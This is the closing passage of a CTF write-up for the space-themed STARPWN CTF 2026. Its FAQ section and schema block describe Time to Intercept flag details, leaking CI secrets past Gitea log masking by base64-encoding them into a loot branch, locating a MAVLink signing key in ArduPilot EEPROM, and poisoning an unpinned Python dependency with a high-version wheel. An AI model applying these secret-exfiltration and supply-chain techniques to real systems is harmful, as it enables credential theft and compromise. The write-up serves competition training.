V1 leaks the required delta-v and wait-time values in the grader's error message, allowing teams to iterate toward the answer without understanding the physics. V2 prints only submitted values — the oracle is removed. The physics, tolerances, and solver are identical; only the feedback level differs. The flag for V2 is `STARPWN{dont_print_th3_answer_}`, a self-documenting patch note.

### How does the Gitea Actions base64 bypass work for secret exfiltration?

Gitea (like GitHub Actions) masks the literal secret string from runner logs. If the secret appears verbatim in `stdout`, it is replaced with `***`. However, masking applies only to the raw string — if you pipe the secret through `base64` before printing, the masked string never appears and the encoded output is logged without redaction. The attacker then commits the base64 output to a `loot` branch and decodes it after the job completes.

### What MAVLink signing key offset should you check in an ArduPilot EEPROM?

First scan the EEPROM for the magic value `0x3852FCD1` (little-endian 4 bytes). The 32-byte signing key immediately follows the magic value. If the magic is absent (some firmware builds omit it), fall back to the static offset `0x1F80` in the `StorageKeys` region. Always validate the EEPROM's `PA` magic header first.

### How do you exploit an unpinned Python dependency in a CTF flight application?

Build a poisoned wheel for the vulnerable package at a version number higher than the currently installed version (e.g., `99.0.0` against `>=1.0.0`). Upload it to the target's build API. Trigger a build — the resolver picks the highest available version, installs your wheel, and the malicious `handle_command()` function replaces the legitimate one. Sending a command the malicious handler intercepts (e.g., `DEPLOY_SOLAR_PANEL`) causes it to return the `FLAG` environment variable as the command acknowledgement payload.

```json
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "What is the STARPWN CTF 2026 and when did it run?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "STARPWN CTF 2026 is a space-themed Jeopardy-style CTF focused on spacecraft systems, orbital mechanics, ground operations, RF communications, and OSINT. It ran in 2026 and requires real physics knowledge including Hohmann transfer equations and MAVLink protocol."
      }
    },
    {
      "@type": "Question",
      "name": "How do you stop a tumbling spacecraft in the Tumbling Through Space challenge?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Compute angular momentum L = I × ω, apply counter-torque T = −L/|L| × 0.98 N·m, burn for t = |L|/0.98 seconds rounded up to the next whole second to correct for the simulator's whole-second grid."
      }
    },
    {
      "@type": "Question",
      "name": "What is the difference between Time to Intercept V1 and V2?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "V1 leaks required delta-v and wait time in grader error messages; V2 removes that oracle. The physics and solver are identical — only the feedback level differs."
      }
    },
    {
      "@type": "Question",
      "name": "How does the Gitea Actions base64 bypass work for secret exfiltration?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Gitea masks the literal secret string in logs but not its base64 encoding. Piping the secret through base64 before printing defeats log masking and the encoded value is committed to a loot branch for later decoding."
      }
    },
    {
      "@type": "Question",
      "name": "What MAVLink signing key offset should you check in an ArduPilot EEPROM?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Scan for magic 0x3852FCD1; the 32-byte key follows immediately. If the magic is absent, fall back to offset 0x1F80 in the StorageKeys region."
      }
    },
    {
      "@type": "Question",
      "name": "How do you exploit an unpinned Python dependency in a CTF flight application?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Build a poisoned wheel at version 99.0.0 for a package constrained to >=1.0.0. Upload it, trigger a build, and the resolver installs your wheel. A malicious handle_command() intercepts DEPLOY_SOLAR_PANEL and returns the FLAG environment variable."
      }
    }
  ]
}
```

---

All seven challenges solved. Full solver scripts, EEPROM layout figures, the poisoned wheel builder, the WebSocket ttyd client, and the Node.js automation for Mission Control are in the [STARPWN-CTF-2026 repository on GitHub](https://github.com/Abdelkad3r/STARPWN-CTF-2026). For the eight OSINT, RF, and Misc challenges from the first half of the event, see [Part 1 of this writeup series](/ctf-writeups/starpwn-ctf-2026-writeup-part-1/).

*Writeup by CyberSecurity Elite Team — cybersecurityelite.com. Challenge content and flag values are the intellectual property of the STARPWN CTF 2026 organizers.*
